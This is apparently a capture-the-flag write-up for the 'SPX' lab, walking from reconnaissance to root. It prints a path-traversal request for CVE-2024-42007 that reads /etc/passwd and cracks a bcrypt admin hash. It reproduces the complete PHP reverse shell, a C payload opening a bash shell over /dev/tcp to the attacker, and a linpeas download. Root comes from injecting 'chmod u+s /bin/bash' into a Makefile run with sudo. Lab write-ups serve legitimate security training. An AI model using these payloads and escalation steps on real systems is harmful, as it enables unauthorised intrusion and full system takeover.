# CTF Writeup: SPX

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.129.108
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-30 07:27 -0500
Nmap scan report for 192.168.129.108
Host is up (0.028s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Tiny File Manager
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.15 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.52 ms 192.168.45.1
2   27.43 ms 192.168.45.254
3   28.00 ms 192.168.251.1
4   28.04 ms 192.168.129.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.78 seconds
```

Upon accessing the website running on port 80, we are being greeted by an login panel and an web application called "H3K - Tiny File Manager".

Enumerated endpoints.

```
 dirsearch -u http://192.168.127.108    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/SPX/reports/http_192.168.127.108/_25-12-30_23-45-13.txt

Target: http://192.168.127.108/

[23:45:13] Starting:                                                                                                                          
[23:45:15] 403 -  280B  - /.htaccess.orig                                   
[23:45:15] 403 -  280B  - /.ht_wsr.txt
[23:45:15] 403 -  280B  - /.htaccess.bak1
[23:45:15] 403 -  280B  - /.htaccess.save
[23:45:15] 403 -  280B  - /.htaccess.sample
[23:45:15] 403 -  280B  - /.htaccess_extra
[23:45:15] 403 -  280B  - /.htaccess_orig                                   
[23:45:15] 403 -  280B  - /.htaccess_sc
[23:45:15] 403 -  280B  - /.htaccessOLD
[23:45:15] 403 -  280B  - /.html                                            
[23:45:15] 403 -  280B  - /.htaccessBAK
[23:45:15] 403 -  280B  - /.htaccessOLD2                                    
[23:45:15] 403 -  280B  - /.htm                                             
[23:45:15] 403 -  280B  - /.htpasswd_test                                   
[23:45:15] 403 -  280B  - /.htpasswds
[23:45:15] 403 -  280B  - /.httr-oauth                                      
[23:45:16] 403 -  280B  - /.php                                             
[23:45:47] 200 -   22KB - /phpinfo.php                                      
[23:45:52] 403 -  280B  - /server-status                                    
[23:45:53] 403 -  280B  - /server-status/                                   
                                                                             
Task Completed
```

The /phpinfo.php couldn't give us to much information.

## Vulnerability Assessment

Searching up for CVE's.

```
searchsploit Tiny File Manager
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Script | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Sc | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                            | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                       | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                         | php/webapps/15194.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We found an RCE Exploit, let's search up for custom exploits on github.

We found multiple exploits, but they all need to be authenticated. Let's map the domain spx.offsec to our target ip in our local dns file /etc/hosts in order to enumerate subdomains.

```
sudo echo 192.168.127.108 spx.offsec | sudo tee -a /etc/hosts
```

Enumerated subdomains utilizing ffuf.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://spx.offsec -H "Host: FUZZ.spx.offsec" -fs 12045

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://spx.offsec
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.spx.offsec
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12045
________________________________________________

[WARN] Caught keyboard interrupt (Ctrl-C)
```

After careful observation, there was nothing. I'm assuming since the phpinfo.php file was the only thing we were able to enumerate that there must be smth in there. Since the lab itself is named "SPX". I will enumerate CVE's for the SPX Version 0.4.15 which is listed within the phpinfo.php file.

Apparently SPX 0.4.15 is vulnerable to directory traversal "CVE-2024-42007".

After further analyzing of the CVE, there was path traversal activated in the SPX_UI_URI variable. But we had to get the http_key, which was listed on the phpinfo.php.

```
curl --path-as-is "http://spx.offsec/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
profiler:x:1000:1000::/home/profiler:/bin/bash
```

We now have an potential username "profiler". Let's search up where the default directory for configuration files for "h3k tiny file manager" is.

It should be /var/www/html/tinyfilemanager.php, but I couldn't find the file. I was hardstuck here, so I searched up the next step, apparently the /var/www/html/index.php will provide us credentials which was very unexpected.

After observing the index.php file it seemed that it differs a lot from the one we see manually when opening up the browser, i'm unsure why since it's the same. But it reveals all the backend processes. 

```
// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$auth_users = array(
    'admin' => '$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG',
    'user' => '$2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi'
);
```

We now have an hash encoded password for the "admin" user. Let's try & decode it!

```
john admin.hash --wordlist=wordlist.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates left, minimum 24 needed for performance.
lowprofile       (?)     
1g 0:00:00:00 DONE (2025-12-31 01:03) 11.11g/s 22.22p/s 22.22c/s 22.22C/s profiler..lowprofile
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

When logging in with those credentials, we have file upload functionality. Instead of utilizing an RCE Exploit, we can just do it manually.

Uploaded the following reverse shell .php script.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.191';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

We rechecked and it's now stored in the webroot of the target server.

Let's start up our listener on port 80.

```
nc -lvnp 80
```

Executed the malicious script.

```
curl http://spx.offsec/php-reverse-shell.php
```

Gained RCE as user "www-data".

```
c -lvnp 80                                 
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.127.108] 60358
Linux spx 5.15.0-122-generic #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 06:11:13 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Reused credentials and logged into user "profiler" with profiler:lowprofile

```
$ su profiler
Password: lowprofile
whoami
profiler
```

Retrieved local.txt in /home/profiler directory.

```
242fc6878518ffbc5d06000dd00c8aa9
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

User "profiler" can run the make binary with sudo rights to install php-spx binary inside /home/profiler 

```
profiler@spx:~$ sudo -l
Matching Defaults entries for profiler on spx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User profiler may run the following commands on spx:
    (ALL) /usr/bin/make install -C /home/profiler/php-spx
```

Since I didn't know how to exploit this, I first wanted to enumerate further before digging into this.

Downloaded linpeas onto the target system.

```
profiler@spx:/tmp$ wget http://192.168.45.191/linpeas.sh
--2025-12-31 06:19:07--  http://192.168.45.191/linpeas.sh
Connecting to 192.168.45.191:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971820 (949K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                          0%[                                                                                       linpeas.sh                                         31%[=================================>                                                     linpeas.sh                                         64%[=====================================================================>                 linpeas.sh                                        100%[=============================================================================================================>] 949.04K  1.80MB/s    in 0.5s    

2025-12-31 06:19:07 (1.80 MB/s) - ‘linpeas.sh’ saved [971820/971820]
```

Gave it executable permissions.

```
chmod +x linpeas.sh
```

I tried to create an php-spx bash reverse shell and run the file, but this didn't work. Since the "-C" parameter specifies the make binary to first navigate into the specified directory, before actually compiling any files.

So I'm assuming the only thing we have to do is create an malicious .c file inside the directory and it will get executed with root permissions.

I created an "malicious.c" file inside the php-spx directory.

```
profiler@spx:~/php-spx$ cat malicious.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {

    setgid(0);
    setuid(0);
    system("bash -i >& /dev/tcp/192.168.45.191/22 0>&1");
}
```

Started up my listener on port 22.

```
nc -lvnp 22
```

Compiled the .c file to an Makefile binary.

```
gcc -shared -fPIC -nostartfiles malicious.c -o Makefile
```

This didn't work.

Let's do it in a different approach, let's embedd an malicious command inside the original Makefile and run the binary.

```
echo -e 'all:\n\t@echo "Do nothing in all"\n\ninstall:\n\tchmod u+s /bin/bash' >> Makefile
```

Ran the file with sudo permissions.

```
profiler@spx:~$ sudo /usr/bin/make install -C /home/profiler/php-spx
make: Entering directory '/home/profiler/php-spx'
Makefile:268: warning: overriding recipe for target 'all'
Makefile:52: warning: ignoring old recipe for target 'all'
Installing shared extensions:     /usr/lib/php/20210902/
Installing SPX web UI to: /usr/share/misc/php-spx/assets/web-ui
chmod u+s /bin/bash
make: Leaving directory '/home/profiler/php-spx'
```

Executed the /bin/bash binary with an SUID set and gained shell as user "root".

```
profiler@spx:~$ /bin/bash -p
bash-5.1#
```

Retrieved proof.txt in /root directory.

```
28c7eaf67a3176f83d49b92467ea6816
```
